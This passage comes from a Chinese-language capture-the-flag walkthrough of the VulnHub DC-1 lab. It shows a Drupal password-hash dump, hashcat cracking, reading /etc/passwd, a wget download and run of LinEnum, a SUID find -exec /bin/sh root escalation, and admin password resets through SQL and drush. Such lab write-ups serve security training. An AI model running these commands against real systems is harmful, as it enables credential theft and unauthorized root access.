| actions                     |
| authmap                     |
| batch                       |
| block                       |
| block_custom                |
| block_node_type             |
| block_role                  |
| blocked_ips                 |
| cache                       |
| cache_block                 |
| cache_bootstrap             |
| cache_field                 |
| cache_filter                |
| cache_form                  |
| cache_image                 |
| cache_menu                  |
| cache_page                  |
| cache_path                  |
| cache_update                |
| cache_views                 |
| cache_views_data            |
| comment                     |
| ctools_css_cache            |
| ctools_object_cache         |
| date_format_locale          |
| date_format_type            |
| date_formats                |
| field_config                |
| field_config_instance       |
| field_data_body             |
| field_data_comment_body     |
| field_data_field_image      |
| field_data_field_tags       |
| field_revision_body         |
| field_revision_comment_body |
| field_revision_field_image  |
| field_revision_field_tags   |
| file_managed                |
| file_usage                  |
| filter                      |
| filter_format               |
| flood                       |
| history                     |
| image_effects               |
| image_styles                |
| menu_custom                 |
| menu_links                  |
| menu_router                 |
| node                        |
| node_access                 |
| node_comment_statistics     |
| node_revision               |
| node_type                   |
| queue                       |
| rdf_mapping                 |
| registry                    |
| registry_file               |
| role                        |
| role_permission             |
| search_dataset              |
| search_index                |
| search_node_links           |
| search_total                |
| semaphore                   |
| sequences                   |
| sessions                    |
| shortcut_set                |
| shortcut_set_users          |
| system                      |
| taxonomy_index              |
| taxonomy_term_data          |
| taxonomy_term_hierarchy     |
| taxonomy_vocabulary         |
| url_alias                   |
| users                       |
| users_roles                 |
| variable                    |
| views_display               |
| views_view                  |
| watchdog                    |
+-----------------------------+
```
查询用户名密码
```mysql
select name,pass from users;
+-------+---------------------------------------------------------+
| name  | pass                                                    |
+-------+---------------------------------------------------------+
|       |                                                         |
| admin | $S$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5.i38jnEKuDR |
| Fred  | $S$DWGrxef6.D0cwB5Ts.GlnLw15chRRWH2s1R3QBwC0EkvBQ/9TCGg |
+-------+---------------------------------------------------------+
```
得到了密码的 hash 就得跑明文了,下面使用 hashcat 爆破
当然不能直接跑,得知道 Hash id , `hashcat --help` 查看 hash 对照表
```bash
root@kali:~# hashcat --help | grep "Drupal"
   7900 | Drupal7                                          | Forums, CMS, E-Commerce, Frameworks
```
这里把 hash 先写到源文件里,等下直接引用
```bash
echo "\$S\$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5.i38jnEKuDR" > source.txt
echo "\$S\$DWGrxef6.D0cwB5Ts.GlnLw15chRRWH2s1R3QBwC0EkvBQ/9TCGg" >> source.txt
```
然后找个密码表,推荐一下我自己的字典项目 https://github.com/ffffffff0x/AboutSecurity/tree/master/Dic/Auth/password
```bash
hashcat -m 7900 -a 0 source.txt pass01.txt
-m 指定要破解的 hash 类型，如果不指定类型，则默认是 MD5
-a 指定要使用的破解模式，其值参考后面对参数。“-a 0”字典攻击，“-a 1” 组合攻击；“-a 3”掩码攻击。
source.txt 你要爆破的 hash 列表
pass01.txt 你的密码表
```
一切准备就绪,run
![](../../../../../../assets/img/Security/安全资源/靶机/VulnHub/DC/DC1/9.png)
只跑出一个 MyPassword
后面 google 到了 admin 的密码 53cr3t
好,admin 的账号密码都有了,那么直接登录,可以看到 dashboard 里就有 flag3
![](../../../../../../assets/img/Security/安全资源/靶机/VulnHub/DC/DC1/10.png)
```
Special PERMS will help FIND the passwd - but you'll need to -exec that command to work out how to get what's in the shadow.
```
---
# flag4
```bash
cat /etc/passwd
```
![](../../../../../../assets/img/Security/安全资源/靶机/VulnHub/DC/DC1/11.png)
发现一个 flag4 用户，直接看家目录文件
```bash
cat /home/flag4/flag4.txt
```
```
Can you use this same method to find or access the flag in root?
Probably. But perhaps it's not that easy.  Or maybe it is?
```
---
# flag5
这里使用 [LinEnum](https://github.com/rebootuser/LinEnum) 进行提权
kali 下载
```bash
git clone https://github.com/rebootuser/LinEnum.git
```
下完了使用 HTTP 服务传过去
> 注: 如果 git速度太慢，可以给 git 或终端走代理
```bash
python -m SimpleHTTPServer 8080
```
![](../../../../../../assets/img/Security/安全资源/靶机/VulnHub/DC/DC1/12.png)
```bash
wget http://192.168.141.134:8080/LinEnum/LinEnum.sh
```
![](../../../../../../assets/img/Security/安全资源/靶机/VulnHub/DC/DC1/13.png)
从 kali 上下好后直接运行
```bash
bash LinEnum.sh
```
![](../../../../../../assets/img/Security/安全资源/靶机/VulnHub/DC/DC1/14.png)
可以通过 find 进行提权
```bash
find . -exec /bin/sh \; -quit
```
![](../../../../../../assets/img/Security/安全资源/靶机/VulnHub/DC/DC1/15.png)
```
ls /root
cat /root/thefinalflag.txt
```
提权成功,感谢靶机作者 @DCUA7,查看最终 flag
![](../../../../../../assets/img/Security/安全资源/靶机/VulnHub/DC/DC1/16.png)
---
# 补充
在 flag3 跑 hashcat 时,如果跑不出密码,除了 google 以外还有2种方式登录 admin 账号
- 直接数据库修改 Drupal users 表
- 通过 drush 修改 admin 用户的密码
**直接数据库修改 Drupal users 表**
我都爆出了 Fred 的明文 MyPassword 了,那我直接把 admin 的改成和 Fred 的一样不就行了
```bash
mysql -u dbuser -p
use drupaldb;
update users set pass='$S$DWGrxef6.D0cwB5Ts.GlnLw15chRRWH2s1R3QBwC0EkvBQ/9TCGg' where name='admin';
```
![](../../../../../../assets/img/Security/安全资源/靶机/VulnHub/DC/DC1/17.png)
ok 登上去了
**通过 drush 修改 admin 用户的密码**
Drush是一个 shell 接口，用于从云服务器命令行管理 Drupal。
现在服务器上找找 drush,没有的话还得给他传一个
```
find / -name drush
/var/www/sites/all/modules/views/drush
/var/www/sites/all/modules/ctools/drush
/usr/local/bin/drush
```
然后直接修改 admin 密码
```
/usr/local/bin/drush user-password admin --password="admin"
```
![](../../../../../../assets/img/Security/安全资源/靶机/VulnHub/DC/DC1/18.png)
测试一下,ok 登上去了
![](../../../../../../assets/img/Security/安全资源/靶机/VulnHub/DC/DC1/19.png)